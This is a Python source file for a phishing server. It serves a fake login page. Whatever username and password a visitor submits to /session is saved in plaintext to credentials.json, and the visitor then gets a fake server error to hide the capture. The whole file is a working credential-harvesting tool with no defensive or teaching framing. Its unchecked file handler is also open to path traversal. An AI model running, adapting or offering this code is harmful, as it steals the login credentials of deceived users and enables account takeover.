import json
import os
import sys
from functools import cached_property
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Optional
from urllib.parse import parse_qs, urlparse

IP = "0.0.0.0"
PORT = 18018
SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
STATIC_DIR = os.path.join(SCRIPT_DIR, "static")
CREDENTIALS_FILE = os.path.join(SCRIPT_DIR, "credentials.json")


def add_credential(username: str, password: str):
    if not os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, "w") as f:
            json.dump([], f, indent=4)
    with open(CREDENTIALS_FILE, "r") as f:
        credentials = json.load(f)
    credentials.append({"username": username, "password": password})
    with open(CREDENTIALS_FILE, "w") as f:
        json.dump(credentials, f, indent=4)


class ReqHandler(BaseHTTPRequestHandler):
    @cached_property
    def url(self):
        return urlparse(self.path)

    @cached_property
    def query(self):
        return parse_qs(self.url.query)

    @cached_property
    def post_data(self):
        return parse_qs(
            self.rfile.read(int(self.headers["Content-Length"])).decode("utf-8")
        )

    def do_GET(self):
        if self.url.path == "/":
            self.handle_default()
            return
        if self.url.path == "/login":
            self.handle_login()
            return
        return self.handle_file()

    def do_POST(self):
        if self.url.path == "/session":
            self.handle_session()
            return
        self.handle_default()

    def handle_session(self):
        username = self.post_data.get("login")
        password = self.post_data.get("password")
        if username is None or password is None:
            self.send_error(HTTPStatus.BAD_REQUEST)
            return
        username = username[0]
        password = password[0]
        add_credential(username, password)
        self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR)
        self.end_headers()
        return

    def handle_default(self):
        self.send_response(HTTPStatus.FOUND)
        self.send_header("Location", "/login")
        self.end_headers()

    def handle_login(self):
        self.show_page("/index.html")

    def handle_file(self):
        content_type = "text/html"
        if self.url.path.endswith(".css"):
            content_type = "text/css"
        elif self.url.path.endswith(".js"):
            content_type = "text/javascript"
        self.show_page(self.url.path, content_type)

    def show_page(self, page: str, content_type: str = "text/html"):
        try:
            with open(STATIC_DIR + page, "rb") as f:
                self.send_response(HTTPStatus.OK)
                self.send_header("Content-Type", content_type)
                self.end_headers()
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.send_error(HTTPStatus.NOT_FOUND)


def main(argv: Optional[list[str]] = None):
    if argv is None:
        argv = sys.argv[1:]
    if not argv:
        (ip, port) = (IP, PORT)
    elif len(argv) > 1:
        (ip, port) = (argv[0], int(argv[1]))
    else:
        print("Enter both ip and port in the command-line arguments.")
        return

    with HTTPServer((ip, port), ReqHandler) as server:
        print(f"Server running on {ip}:{port}")
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            pass
    print("Server closed.")


if __name__ == "__main__":
    main()
